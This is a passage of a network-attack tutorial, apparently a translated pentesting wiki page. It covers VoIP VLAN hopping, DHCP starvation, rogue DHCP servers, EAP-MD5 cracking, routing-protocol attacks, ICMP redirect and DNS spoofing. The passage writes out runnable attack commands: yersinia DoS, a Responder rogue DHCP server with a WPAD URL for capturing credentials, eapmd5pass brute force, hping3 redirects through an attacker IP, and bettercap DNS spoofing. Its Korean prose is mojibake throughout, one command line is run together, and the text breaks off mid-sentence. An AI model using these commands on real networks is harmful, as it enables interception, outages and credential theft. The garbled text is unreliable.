VoIP ì „í™”ëŠ” IoT ì¥ì¹˜ì™€ ì ì  ë” í†µí•©ë˜ì–´ ìˆìœ¼ë©°, íŠ¹ë³„í•œ ì „í™”ë²ˆí˜¸ë¥¼ í†µí•´ ë¬¸ì„ ì—´ê±°ë‚˜ ì˜¨ë„ ì¡°ì ˆê¸°ë¥¼ ì œì–´í•˜ëŠ” ê¸°ëŠ¥ì„ ì œê³µí•©ë‹ˆë‹¤. ê·¸ëŸ¬ë‚˜ ì´ëŸ¬í•œ í†µí•©ì€ ë³´ì•ˆ ìœ„í—˜ì„ ì´ˆë˜í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ë„êµ¬ [**voiphopper**](http://voiphopper.sourceforge.net)ëŠ” ë‹¤ì–‘í•œ í™˜ê²½(Cisco, Avaya, Nortel, Alcatel-Lucent)ì—ì„œ VoIP ì „í™”ë¥¼ ì—ë®¬ë ˆì´íŠ¸í•˜ë„ë¡ ì„¤ê³„ë˜ì—ˆìŠµë‹ˆë‹¤. CDP, DHCP, LLDP-MED ë° 802.1Q ARPì™€ ê°™ì€ í”„ë¡œí† ì½œì„ ì‚¬ìš©í•˜ì—¬ ìŒì„± ë„¤íŠ¸ì›Œí¬ì˜ VLAN IDë¥¼ ë°œê²¬í•©ë‹ˆë‹¤.

**VoIP Hopper**ëŠ” Cisco Discovery Protocol (CDP)ì— ëŒ€í•´ ì„¸ ê°€ì§€ ëª¨ë“œë¥¼ ì œê³µí•©ë‹ˆë‹¤:

1. **Sniff Mode** (`-c 0`): ë„¤íŠ¸ì›Œí¬ íŒ¨í‚·ì„ ë¶„ì„í•˜ì—¬ VLAN IDë¥¼ ì‹ë³„í•©ë‹ˆë‹¤.
2. **Spoof Mode** (`-c 1`): ì‹¤ì œ VoIP ì¥ì¹˜ì˜ íŒ¨í‚·ì„ ëª¨ë°©í•˜ëŠ” ì‚¬ìš©ì ì •ì˜ íŒ¨í‚·ì„ ìƒì„±í•©ë‹ˆë‹¤.
3. **Spoof with Pre-made Packet Mode** (`-c 2`): íŠ¹ì • Cisco IP ì „í™” ëª¨ë¸ì˜ íŒ¨í‚·ê³¼ ë™ì¼í•œ íŒ¨í‚·ì„ ì „ì†¡í•©ë‹ˆë‹¤.

ì†ë„ë¥¼ ìœ„í•´ ì„ í˜¸ë˜ëŠ” ëª¨ë“œëŠ” ì„¸ ë²ˆì§¸ ëª¨ë“œì…ë‹ˆë‹¤. ë‹¤ìŒì„ ì§€ì •í•´ì•¼ í•©ë‹ˆë‹¤:

* ê³µê²©ìì˜ ë„¤íŠ¸ì›Œí¬ ì¸í„°í˜ì´ìŠ¤ (`-i` ë§¤ê°œë³€ìˆ˜).
* ì—ë®¬ë ˆì´íŠ¸ë˜ëŠ” VoIP ì¥ì¹˜ì˜ ì´ë¦„ (`-E` ë§¤ê°œë³€ìˆ˜), Cisco ëª…ëª… í˜•ì‹(ì˜ˆ: SEP ë‹¤ìŒì— MAC ì£¼ì†Œ)ì„ ì¤€ìˆ˜í•©ë‹ˆë‹¤.

ê¸°ì—… í™˜ê²½ì—ì„œ ê¸°ì¡´ VoIP ì¥ì¹˜ë¥¼ ëª¨ë°©í•˜ê¸° ìœ„í•´ ë‹¤ìŒì„ ìˆ˜í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

* ì „í™”ê¸°ì˜ MAC ë¼ë²¨ì„ ê²€ì‚¬í•©ë‹ˆë‹¤.
* ì „í™”ê¸°ì˜ ë””ìŠ¤í”Œë ˆì´ ì„¤ì •ì„ íƒìƒ‰í•˜ì—¬ ëª¨ë¸ ì •ë³´ë¥¼ í™•ì¸í•©ë‹ˆë‹¤.
* VoIP ì¥ì¹˜ë¥¼ ë…¸íŠ¸ë¶ì— ì—°ê²°í•˜ê³  Wiresharkë¥¼ ì‚¬ìš©í•˜ì—¬ CDP ìš”ì²­ì„ ê´€ì°°í•©ë‹ˆë‹¤.

ì„¸ ë²ˆì§¸ ëª¨ë“œì—ì„œ ë„êµ¬ë¥¼ ì‹¤í–‰í•˜ëŠ” ì˜ˆì œ ëª…ë ¹ì€ ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤:
```bash
voiphopper -i eth1 -E 'SEP001EEEEEEEEE ' -c 2
```
### DHCP ê³µê²©

#### ì—´ê±°
```bash
nmap --script broadcast-dhcp-discover
Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-16 05:30 EDT
WARNING: No targets were specified, so 0 hosts scanned.
Pre-scan script results:
| broadcast-dhcp-discover:
|   Response 1 of 1:
|     IP Offered: 192.168.1.250
|     DHCP Message Type: DHCPOFFER
|     Server Identifier: 192.168.1.1
|     IP Address Lease Time: 1m00s
|     Subnet Mask: 255.255.255.0
|     Router: 192.168.1.1
|     Domain Name Server: 192.168.1.1
|_    Domain Name: mynet
Nmap done: 0 IP addresses (0 hosts up) scanned in 5.27 seconds
```
**DoS**

**DoSì˜ ë‘ ê°€ì§€ ìœ í˜•**ì€ DHCP ì„œë²„ì— ëŒ€í•´ ìˆ˜í–‰ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì²« ë²ˆì§¸ëŠ” **ëª¨ë“  ê°€ëŠ¥í•œ IP ì£¼ì†Œë¥¼ ì‚¬ìš©í•˜ê¸° ìœ„í•´ ì¶©ë¶„í•œ ê°€ì§œ í˜¸ìŠ¤íŠ¸ë¥¼ ì‹œë®¬ë ˆì´ì…˜í•˜ëŠ” ê²ƒ**ì…ë‹ˆë‹¤.\
ì´ ê³µê²©ì€ DHCP ì„œë²„ì˜ ì‘ë‹µì„ ë³¼ ìˆ˜ ìˆê³  í”„ë¡œí† ì½œì„ ì™„ë£Œí•  ìˆ˜ ìˆì„ ë•Œë§Œ ì‘ë™í•©ë‹ˆë‹¤ (**Discover** (Comp) --> **Offer** (server) --> **Request** (Comp) --> **ACK** (server)). ì˜ˆë¥¼ ë“¤ì–´, **Wifi ë„¤íŠ¸ì›Œí¬ì—ì„œëŠ” ë¶ˆê°€ëŠ¥í•©ë‹ˆë‹¤**.

DHCP DoSë¥¼ ìˆ˜í–‰í•˜ëŠ” ë˜ ë‹¤ë¥¸ ë°©ë²•ì€ **ëª¨ë“  ê°€ëŠ¥í•œ IPë¥¼ ì†ŒìŠ¤ ì½”ë“œë¡œ ì‚¬ìš©í•˜ì—¬ DHCP-RELEASE íŒ¨í‚·ì„ ë³´ë‚´ëŠ” ê²ƒ**ì…ë‹ˆë‹¤. ê·¸ëŸ¬ë©´ ì„œë²„ëŠ” ëª¨ë“  ì‚¬ìš©ìê°€ IP ì‚¬ìš©ì„ ë§ˆì³¤ë‹¤ê³  ìƒê°í•  ê²ƒì…ë‹ˆë‹¤.
```bash
yersinia dhcp -attack 1
yersinia dhcp -attack 3 #More parameters are needed
```
A more automatic way of doing this is using the tool [DHCPing](https://github.com/kamorin/DHCPig)

You could use the mentioned DoS attacks to force clients to obtain new leases within the environment, and exhaust legitimate servers so that they become unresponsive. So when the legitimate try to reconnect, **ë‹¤ìŒ ê³µê²©ì—ì„œ ì–¸ê¸‰ëœ ì•…ì˜ì ì¸ ê°’ì„ ì œê³µí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤**.

#### ì•…ì˜ì ì¸ ê°’ ì„¤ì •

ì•…ì˜ì ì¸ DHCP ì„œë²„ëŠ” `/usr/share/responder/DHCP.py`ì— ìœ„ì¹˜í•œ DHCP ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‚¬ìš©í•˜ì—¬ ì„¤ì •í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ëŠ” HTTP íŠ¸ë˜í”½ê³¼ ìê²© ì¦ëª…ì„ ìº¡ì²˜í•˜ê¸° ìœ„í•´ íŠ¸ë˜í”½ì„ ì•…ì˜ì ì¸ ì„œë²„ë¡œ ë¦¬ë””ë ‰ì…˜í•˜ëŠ” ë„¤íŠ¸ì›Œí¬ ê³µê²©ì— ìœ ìš©í•©ë‹ˆë‹¤. ê·¸ëŸ¬ë‚˜ ì•…ì˜ì ì¸ ê²Œì´íŠ¸ì›¨ì´ë¥¼ ì„¤ì •í•˜ëŠ” ê²ƒì€ í´ë¼ì´ì–¸íŠ¸ì˜ ì•„ì›ƒë°”ìš´ë“œ íŠ¸ë˜í”½ë§Œ ìº¡ì²˜í•  ìˆ˜ ìˆê¸° ë•Œë¬¸ì— ëœ íš¨ê³¼ì ì´ë©°, ì‹¤ì œ ê²Œì´íŠ¸ì›¨ì´ì˜ ì‘ë‹µì„ ë†“ì¹˜ê²Œ ë©ë‹ˆë‹¤. ëŒ€ì‹ , ë” íš¨ê³¼ì ì¸ ê³µê²©ì„ ìœ„í•´ ì•…ì˜ì ì¸ DNS ë˜ëŠ” WPAD ì„œë²„ë¥¼ ì„¤ì •í•˜ëŠ” ê²ƒì´ ê¶Œì¥ë©ë‹ˆë‹¤.

ì•„ë˜ëŠ” ì•…ì˜ì ì¸ DHCP ì„œë²„ë¥¼ êµ¬ì„±í•˜ê¸° ìœ„í•œ ëª…ë ¹ ì˜µì…˜ì…ë‹ˆë‹¤:

* **ìš°ë¦¬ì˜ IP ì£¼ì†Œ (ê²Œì´íŠ¸ì›¨ì´ ê´‘ê³ )**: `-i 10.0.0.100`ì„ ì‚¬ìš©í•˜ì—¬ ë¨¸ì‹ ì˜ IPë¥¼ ê²Œì´íŠ¸ì›¨ì´ë¡œ ê´‘ê³ í•©ë‹ˆë‹¤.
* **ë¡œì»¬ DNS ë„ë©”ì¸ ì´ë¦„**: ì„ íƒì ìœ¼ë¡œ `-d example.org`ë¥¼ ì‚¬ìš©í•˜ì—¬ ë¡œì»¬ DNS ë„ë©”ì¸ ì´ë¦„ì„ ì„¤ì •í•©ë‹ˆë‹¤.
* **ì›ë˜ ë¼ìš°í„°/ê²Œì´íŠ¸ì›¨ì´ IP**: `-r 10.0.0.1`ì„ ì‚¬ìš©í•˜ì—¬ í•©ë²•ì ì¸ ë¼ìš°í„° ë˜ëŠ” ê²Œì´íŠ¸ì›¨ì´ì˜ IP ì£¼ì†Œë¥¼ ì§€ì •í•©ë‹ˆë‹¤.
* **ê¸°ë³¸ DNS ì„œë²„ IP**: `-p 10.0.0.100`ì„ ì‚¬ìš©í•˜ì—¬ ì œì–´í•˜ëŠ” ì•…ì˜ì ì¸ DNS ì„œë²„ì˜ IP ì£¼ì†Œë¥¼ ì„¤ì •í•©ë‹ˆë‹¤.
* **ë³´ì¡° DNS ì„œë²„ IP**: ì„ íƒì ìœ¼ë¡œ `-s 10.0.0.1`ì„ ì‚¬ìš©í•˜ì—¬ ë³´ì¡° DNS ì„œë²„ IPë¥¼ ì„¤ì •í•©ë‹ˆë‹¤.
* **ë¡œì»¬ ë„¤íŠ¸ì›Œí¬ì˜ ë„·ë§ˆìŠ¤í¬**: `-n 255.255.255.0`ì„ ì‚¬ìš©í•˜ì—¬ ë¡œì»¬ ë„¤íŠ¸ì›Œí¬ì˜ ë„·ë§ˆìŠ¤í¬ë¥¼ ì •ì˜í•©ë‹ˆë‹¤.
* **DHCP íŠ¸ë˜í”½ì„ ìœ„í•œ ì¸í„°í˜ì´ìŠ¤**: `-I eth1`ì„ ì‚¬ìš©í•˜ì—¬ íŠ¹ì • ë„¤íŠ¸ì›Œí¬ ì¸í„°í˜ì´ìŠ¤ì—ì„œ DHCP íŠ¸ë˜í”½ì„ ìˆ˜ì‹ í•©ë‹ˆë‹¤.
* **WPAD êµ¬ì„± ì£¼ì†Œ**: `-w â€œhttp://10.0.0.100/wpad.datâ€`ì„ ì‚¬ìš©í•˜ì—¬ ì›¹ íŠ¸ë˜í”½ ê°€ë¡œì±„ê¸°ë¥¼ ì§€ì›í•˜ëŠ” WPAD êµ¬ì„± ì£¼ì†Œë¥¼ ì„¤ì •í•©ë‹ˆë‹¤.
* **ê¸°ë³¸ ê²Œì´íŠ¸ì›¨ì´ IP ìŠ¤í‘¸í•‘**: ê¸°ë³¸ ê²Œì´íŠ¸ì›¨ì´ IP ì£¼ì†Œë¥¼ ìŠ¤í‘¸í•‘í•˜ê¸° ìœ„í•´ `-S`ë¥¼ í¬í•¨í•©ë‹ˆë‹¤.
* **ëª¨ë“  DHCP ìš”ì²­ì— ì‘ë‹µ**: ëª¨ë“  DHCP ìš”ì²­ì— ì‘ë‹µí•˜ë„ë¡ ì„œë²„ë¥¼ ì„¤ì •í•˜ê¸° ìœ„í•´ `-R`ì„ í¬í•¨í•˜ì§€ë§Œ, ì´ëŠ” ì†ŒìŒì´ ë§ê³  ê°ì§€ë  ìˆ˜ ìˆìŒì„ ìœ ì˜í•´ì•¼ í•©ë‹ˆë‹¤.

ì´ ì˜µì…˜ë“¤ì„ ì˜¬ë°”ë¥´ê²Œ ì‚¬ìš©í•¨ìœ¼ë¡œì¨, ë„¤íŠ¸ì›Œí¬ íŠ¸ë˜í”½ì„ íš¨ê³¼ì ìœ¼ë¡œ ê°€ë¡œì±„ê¸° ìœ„í•œ ì•…ì˜ì ì¸ DHCP ì„œë²„ë¥¼ ì„¤ì •í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```python
# Example to start a rogue DHCP server with specified options
!python /usr/share/responder/DHCP.py -i 10.0.0.100 -d example.org -r 10.0.0.1 -p 10.0.0.100 -s 10.0.0.1 -n 255.255.255.0 -I eth1 -w "http://10.0.0.100/wpad.dat" -S -R
```
### **EAP ê³µê²©**

ë‹¤ìŒì€ 802.1X êµ¬í˜„ì— ëŒ€í•´ ì‚¬ìš©í•  ìˆ˜ ìˆëŠ” ê³µê²© ì „ìˆ ì…ë‹ˆë‹¤:

* EAPë¥¼ í†µí•œ ëŠ¥ë™ì ì¸ ë¬´ì°¨ë³„ ëŒ€ì… ë¹„ë°€ë²ˆí˜¸ ê³µê²©
* ì˜ëª»ëœ EAP ì½˜í…ì¸ ë¡œ RADIUS ì„œë²„ ê³µê²© _\*\*_(ìµìŠ¤í”Œë¡œì‡)
* EAP ë©”ì‹œì§€ ìº¡ì²˜ ë° ì˜¤í”„ë¼ì¸ ë¹„ë°€ë²ˆí˜¸ í¬ë˜í‚¹ (EAP-MD5 ë° PEAP)
* TLS ì¸ì¦ì„œ ê²€ì¦ì„ ìš°íšŒí•˜ê¸° ìœ„í•´ EAP-MD5 ì¸ì¦ ê°•ì œí™”
* í—ˆë¸Œ ë˜ëŠ” ìœ ì‚¬í•œ ì¥ì¹˜ë¥¼ ì‚¬ìš©í•˜ì—¬ ì¸ì¦ ì‹œ ì•…ì„± ë„¤íŠ¸ì›Œí¬ íŠ¸ë˜í”½ ì£¼ì…

ê³µê²©ìê°€ í”¼í•´ìì™€ ì¸ì¦ ì„œë²„ ì‚¬ì´ì— ìˆë‹¤ë©´, ê·¸ëŠ” í•„ìš”ì— ë”°ë¼ ì¸ì¦ í”„ë¡œí† ì½œì„ EAP-MD5ë¡œ ì €í•˜ì‹œí‚¤ê³  ì¸ì¦ ì‹œë„ë¥¼ ìº¡ì²˜í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ê·¸ëŸ° ë‹¤ìŒ, ê·¸ëŠ” ì´ë¥¼ ë‹¤ìŒê³¼ ê°™ì´ ë¬´ì°¨ë³„ ëŒ€ì…í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```
eapmd5pass â€“r pcap.dump â€“w /usr/share/wordlist/sqlmap.txt
```
### FHRP (GLBP & HSRP) Attacks <a href="#id-6196" id="id-6196"></a>

**FHRP** (First Hop Redundancy Protocol)ì€ **í•« ì¤‘ë³µ ë¼ìš°íŒ… ì‹œìŠ¤í…œì„ ìƒì„±í•˜ê¸° ìœ„í•´ ì„¤ê³„ëœ ë„¤íŠ¸ì›Œí¬ í”„ë¡œí† ì½œì˜ í´ë˜ìŠ¤**ì…ë‹ˆë‹¤. FHRPë¥¼ ì‚¬ìš©í•˜ë©´ ë¬¼ë¦¬ì  ë¼ìš°í„°ë¥¼ ë‹¨ì¼ ë…¼ë¦¬ ì¥ì¹˜ë¡œ ê²°í•©í•  ìˆ˜ ìˆì–´ ë‚´ê²°í•¨ì„±ì´ ì¦ê°€í•˜ê³  ë¶€í•˜ ë¶„ì‚°ì— ë„ì›€ì´ ë©ë‹ˆë‹¤.

**Cisco Systems ì—”ì§€ë‹ˆì–´ë“¤ì€ GLBPì™€ HSRPë¼ëŠ” ë‘ ê°€ì§€ FHRP í”„ë¡œí† ì½œì„ ê°œë°œí–ˆìŠµë‹ˆë‹¤.**

{% content-ref url="glbp-and-hsrp-attacks.md" %}
[glbp-and-hsrp-attacks.md](glbp-and-hsrp-attacks.md)
{% endcontent-ref %}

### RIP

ë¼ìš°íŒ… ì •ë³´ í”„ë¡œí† ì½œ(RIP)ì˜ ì„¸ ê°€ì§€ ë²„ì „ì´ ì¡´ì¬í•˜ëŠ” ê²ƒìœ¼ë¡œ ì•Œë ¤ì ¸ ìˆìŠµë‹ˆë‹¤: RIP, RIPv2, RIPng. RIPì™€ RIPv2ëŠ” UDPë¥¼ ì‚¬ìš©í•˜ì—¬ í¬íŠ¸ 520ì„ í†µí•´ í”¼ì–´ì—ê²Œ ë°ì´í„°ê·¸ë¨ì„ ì „ì†¡í•˜ë©°, RIPngëŠ” IPv6 ë©€í‹°ìºìŠ¤íŠ¸ë¥¼ í†µí•´ UDP í¬íŠ¸ 521ë¡œ ë°ì´í„°ê·¸ë¨ì„ ë¸Œë¡œë“œìºìŠ¤íŠ¸í•©ë‹ˆë‹¤. RIPv2ëŠ” MD5 ì¸ì¦ì„ ì§€ì›í•©ë‹ˆë‹¤. ë°˜ë©´, RIPngëŠ” ê¸°ë³¸ ì¸ì¦ì„ í¬í•¨í•˜ì§€ ì•Šìœ¼ë©°, ëŒ€ì‹  IPv6 ë‚´ì—ì„œ ì„ íƒì  IPsec AH ë° ESP í—¤ë”ì— ì˜ì¡´í•©ë‹ˆë‹¤.

* **RIP ë° RIPv2:** í¬íŠ¸ 520ì—ì„œ UDP ë°ì´í„°ê·¸ë¨ì„ í†µí•´ í†µì‹ í•©ë‹ˆë‹¤.
* **RIPng:** IPv6 ë©€í‹°ìºìŠ¤íŠ¸ë¥¼ í†µí•´ ë°ì´í„°ê·¸ë¨ì„ ë¸Œë¡œë“œìºìŠ¤íŠ¸í•˜ê¸° ìœ„í•´ UDP í¬íŠ¸ 521ì„ ì‚¬ìš©í•©ë‹ˆë‹¤.

RIPv2ëŠ” MD5 ì¸ì¦ì„ ì§€ì›í•˜ëŠ” ë°˜ë©´, RIPngëŠ” ê¸°ë³¸ ì¸ì¦ì„ í¬í•¨í•˜ì§€ ì•Šê³  IPv6ì—ì„œ IPsec AH ë° ESP í—¤ë”ì— ì˜ì¡´í•©ë‹ˆë‹¤.

### EIGRP Attacks

**EIGRP (Enhanced Interior Gateway Routing Protocol)**ëŠ” ë™ì  ë¼ìš°íŒ… í”„ë¡œí† ì½œì…ë‹ˆë‹¤. **ê±°ë¦¬ ë²¡í„° í”„ë¡œí† ì½œì…ë‹ˆë‹¤.** **ì¸ì¦**ì´ ì—†ê³  ìˆ˜ë™ ì¸í„°í˜ì´ìŠ¤ê°€ êµ¬ì„±ë˜ì§€ ì•Šì€ ê²½ìš°, **ì¹¨ì…ì**ê°€ EIGRP ë¼ìš°íŒ…ì— ê°„ì„­í•˜ì—¬ **ë¼ìš°íŒ… í…Œì´ë¸” ì˜¤ì—¼**ì„ ì´ˆë˜í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë˜í•œ EIGRP ë„¤íŠ¸ì›Œí¬(ì¦‰, ììœ¨ ì‹œìŠ¤í…œ)ëŠ” **í‰ë©´ì´ë©° ì–´ë–¤ êµ¬ì—­ìœ¼ë¡œë„ ì„¸ë¶„í™”ë˜ì§€ ì•ŠìŠµë‹ˆë‹¤**. **ê³µê²©ìê°€ ê²½ë¡œë¥¼ ì£¼ì…í•˜ë©´**, ì´ ê²½ë¡œëŠ” ììœ¨ EIGRP ì‹œìŠ¤í…œ ì „ë°˜ì— **í¼ì§ˆ ê°€ëŠ¥ì„±ì´ ë†’ìŠµë‹ˆë‹¤**.

EIGRP ì‹œìŠ¤í…œì„ ê³µê²©í•˜ë ¤ë©´ **í•©ë²•ì ì¸ EIGRP ë¼ìš°í„°ì™€ ì´ì›ƒì„ ì„¤ì •í•´ì•¼ í•˜ë©°**, ì´ëŠ” ê¸°ë³¸ ì •ì°°ì—ì„œ ë‹¤ì–‘í•œ ì£¼ì…ì— ì´ë¥´ê¸°ê¹Œì§€ ë§ì€ ê°€ëŠ¥ì„±ì„ ì—´ì–´ì¤ë‹ˆë‹¤.

[**FRRouting**](https://frrouting.org/)ì€ **BGP, OSPF, EIGRP, RIP ë° ê¸°íƒ€ í”„ë¡œí† ì½œì„ ì§€ì›í•˜ëŠ” ê°€ìƒ ë¼ìš°í„°ë¥¼ êµ¬í˜„í•  ìˆ˜ ìˆê²Œ í•´ì¤ë‹ˆë‹¤.** ê³µê²©ìì˜ ì‹œìŠ¤í…œì— ë°°í¬í•˜ê¸°ë§Œ í•˜ë©´ ì‹¤ì œë¡œ ë¼ìš°íŒ… ë„ë©”ì¸ì—ì„œ í•©ë²•ì ì¸ ë¼ìš°í„°ì¸ ì²™í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

{% content-ref url="eigrp-attacks.md" %}
[eigrp-attacks.md](eigrp-attacks.md)
{% endcontent-ref %}

[**Coly**](https://code.google.com/p/coly/)ëŠ” EIGRP (Enhanced Interior Gateway Routing Protocol) ë¸Œë¡œë“œìºìŠ¤íŠ¸ë¥¼ ê°€ë¡œì±„ëŠ” ê¸°ëŠ¥ì„ ê°€ì§€ê³  ìˆìŠµë‹ˆë‹¤. ë˜í•œ ë¼ìš°íŒ… êµ¬ì„±ì„ ë³€ê²½í•˜ëŠ” ë° ì‚¬ìš©í•  ìˆ˜ ìˆëŠ” íŒ¨í‚· ì£¼ì…ì„ í—ˆìš©í•©ë‹ˆë‹¤.

### OSPF

Open Shortest Path First (OSPF) í”„ë¡œí† ì½œì—ì„œ **MD5 ì¸ì¦ì€ ë¼ìš°í„° ê°„ì˜ ì•ˆì „í•œ í†µì‹ ì„ ë³´ì¥í•˜ê¸° ìœ„í•´ ì¼ë°˜ì ìœ¼ë¡œ ì‚¬ìš©ë©ë‹ˆë‹¤**. ê·¸ëŸ¬ë‚˜ ì´ ë³´ì•ˆ ì¡°ì¹˜ëŠ” Loki ë° John the Ripperì™€ ê°™ì€ ë„êµ¬ë¥¼ ì‚¬ìš©í•˜ì—¬ ì†ìƒë  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ëŸ¬í•œ ë„êµ¬ëŠ” MD5 í•´ì‹œë¥¼ ìº¡ì²˜í•˜ê³  í•´ë…í•  ìˆ˜ ìˆì–´ ì¸ì¦ í‚¤ë¥¼ ë…¸ì¶œì‹œí‚µë‹ˆë‹¤. ì´ í‚¤ë¥¼ ì–»ìœ¼ë©´ ìƒˆë¡œìš´ ë¼ìš°íŒ… ì •ë³´ë¥¼ ë„ì…í•˜ëŠ” ë° ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ê²½ë¡œ ë§¤ê°œë³€ìˆ˜ë¥¼ êµ¬ì„±í•˜ê³  ì†ìƒëœ í‚¤ë¥¼ ì„¤ì •í•˜ê¸° ìœ„í•´ ê°ê° _Injection_ ë° _Connection_ íƒ­ì´ ì‚¬ìš©ë©ë‹ˆë‹¤.

* **MD5 í•´ì‹œ ìº¡ì²˜ ë° í•´ë…:** Loki ë° John the Ripperì™€ ê°™ì€ ë„êµ¬ê°€ ì‚¬ìš©ë©ë‹ˆë‹¤.
* **ê²½ë¡œ ë§¤ê°œë³€ìˆ˜ êµ¬ì„±:** _Injection_ íƒ­ì„ í†µí•´ ìˆ˜í–‰ë©ë‹ˆë‹¤.
* **ì†ìƒëœ í‚¤ ì„¤ì •:** í‚¤ëŠ” _Connection_ íƒ­ì—ì„œ êµ¬ì„±ë©ë‹ˆë‹¤.

### Other Generic Tools & Sources

* [**Above**](https://github.com/c4s73r/Above): ë„¤íŠ¸ì›Œí¬ íŠ¸ë˜í”½ì„ ìŠ¤ìº”í•˜ê³  ì·¨ì•½ì ì„ ì°¾ëŠ” ë„êµ¬
* **ë„¤íŠ¸ì›Œí¬ ê³µê²©ì— ëŒ€í•œ ë” ë§ì€ ì •ë³´**ëŠ” [**ì—¬ê¸°**](https://github.com/Sab0tag3d/MITM-cheatsheet)ì—ì„œ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

## **Spoofing**

ê³µê²©ìëŠ” ê°€ì§œ DHCP ì‘ë‹µì„ ë³´ë‚´ ë„¤íŠ¸ì›Œí¬ì˜ ìƒˆë¡œìš´ êµ¬ì„±ì›ì˜ ëª¨ë“  ë„¤íŠ¸ì›Œí¬ ë§¤ê°œë³€ìˆ˜(GW, IP, DNS)ë¥¼ êµ¬ì„±í•©ë‹ˆë‹¤.
```bash
Ettercap
yersinia dhcp -attack 2 #More parameters are needed
```
### ARP Spoofing

Check the [previous section](./#arp-spoofing).

### ICMPRedirect

ICMP RedirectëŠ” ê³µê²©ìê°€ IPì— ë„ë‹¬í•˜ëŠ” ê°€ì¥ ì¢‹ì€ ë°©ë²•ì„ì„ ë‚˜íƒ€ë‚´ëŠ” ICMP íŒ¨í‚· ìœ í˜• 1 ì½”ë“œ 5ë¥¼ ì „ì†¡í•˜ëŠ” ê²ƒì…ë‹ˆë‹¤. ê·¸ëŸ° ë‹¤ìŒ í”¼í•´ìê°€ IPì— ì—°ë½í•˜ê³ ì í•  ë•Œ íŒ¨í‚·ì„ ê³µê²©ìë¥¼ í†µí•´ ì „ì†¡í•©ë‹ˆë‹¤.
```bash
Ettercap
icmp_redirect
hping3 [VICTIM IP ADDRESS] -C 5 -K 1 -a [VICTIM DEFAULT GW IP ADDRESS] --icmp-gw [ATTACKER IP ADDRESS] --icmp-ipdst [DST IP ADDRESS] --icmp-ipsrc [VICTIM IP ADDRESS] #Send icmp to [1] form [2], route to [3] packets sent to [4] from [5]
```
### DNS Spoofing

ê³µê²©ìëŠ” í”¼í•´ìê°€ ìš”ì²­í•˜ëŠ” ì¼ë¶€(ë˜ëŠ” ëª¨ë“ ) ë„ë©”ì¸ì„ í•´ê²°í•  ê²ƒì…ë‹ˆë‹¤.
```bash
set dns.spoof.hosts ./dns.spoof.hosts; dns.spoof on
```
**dnsmasqë¡œ ìì²´ DNS êµ¬ì„±í•˜ê¸°**
```bash
apt-get install dnsmasqecho "addn-hosts=dnsmasq.hosts" > dnsmasq.conf #Create dnsmasq.confecho "127.0.0.1   domain.example.com" > dnsmasq.hosts #Domains in dnsmasq.hosts will be the domains resolved by the Dsudo dnsmasq -C dnsmasq.conf --no-daemon
dig @localhost domain.example.com # Test the configured DNS
```
### ë¡œì»¬ ê²Œì´íŠ¸ì›¨ì´

ì‹œìŠ¤í…œ ë° ë„¤íŠ¸ì›Œí¬ì— ëŒ€í•œ ì—¬ëŸ¬ ê²½ë¡œê°€ ì¢…ì¢… ì¡´ì¬í•©ë‹ˆë‹¤. ë¡œì»¬ ë„¤íŠ¸ì›Œí¬ ë‚´ì—ì„œ MAC ì£¼ì†Œ ëª©ë¡ì„ ì‘ì„±í•œ í›„, _gateway-finder.py_ë¥¼ ì‚¬ìš©í•˜ì—¬ IPv4 í¬ì›Œë”©ì„ ì§€ì›í•˜ëŠ” í˜¸ìŠ¤íŠ¸ë¥¼ ì‹ë³„í•©ë‹ˆë‹¤.
```
root@kali:~# git clone https://github.com/pentestmonkey/gateway-finder.git
root@kali:~# cd gateway-finder/
root@kali:~# arp-scan -l | tee hosts.txt
Interface: eth0, datalink type: EN10MB (Ethernet)
Starting arp-scan 1.6 with 256 hosts (http://www.nta-monitor.com/tools/arp-scan/)
10.0.0.100     00:13:72:09:ad:76       Dell Inc.
10.0.0.200     00:90:27:43:c0:57       INTEL CORPORATION
10.0.0.254     00:08:74:c0:40:ce       Dell Computer Corp.

root@kali:~/gateway-finder# ./gateway-finder.py -f hosts.txt -i 209.85.227.99
gateway-finder v1.0 http://pentestmonkey.net/tools/gateway-finder
[+] Using interface eth0 (-I to change)
[+] Found 3 MAC addresses in hosts.txt
[+] We can ping 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
[+] We can reach TCP port 80 on 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
```
### [Spoofing LLMNR, NBT-NS, and mDNS](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

DNS ì¡°íšŒê°€ ì‹¤íŒ¨í•  ë•Œ ë¡œì»¬ í˜¸ìŠ¤íŠ¸ í•´ìƒë„ë¥¼ ìœ„í•´ Microsoft ì‹œìŠ¤í…œì€ **Link-Local Multicast Name Resolution (LLMNR)** ë° **NetBIOS Name Service (NBT-NS)**ì— ì˜ì¡´í•©ë‹ˆë‹¤. ìœ ì‚¬í•˜ê²Œ, **Apple Bonjour** ë° **Linux zero-configuration** êµ¬í˜„ì€ ë„¤íŠ¸ì›Œí¬ ë‚´ ì‹œìŠ¤í…œì„ ë°œê²¬í•˜ê¸° ìœ„í•´ **Multicast DNS (mDNS)**ë¥¼ ì‚¬ìš©í•©ë‹ˆë‹¤. ì´ëŸ¬í•œ í”„ë¡œí† ì½œì˜ ì¸ì¦ë˜ì§€ ì•Šì€ íŠ¹ì„±ê³¼ UDPë¥¼ í†µí•œ ë©”ì‹œì§€ ë¸Œë¡œë“œìºìŠ¤íŒ…ìœ¼ë¡œ ì¸í•´ ê³µê²©ìëŠ” ì‚¬ìš©ìë¥¼ ì•…ì„± ì„œë¹„ìŠ¤ë¡œ ë¦¬ë””ë ‰ì…˜í•˜ê¸° ìœ„í•´ ì´ë¥¼ 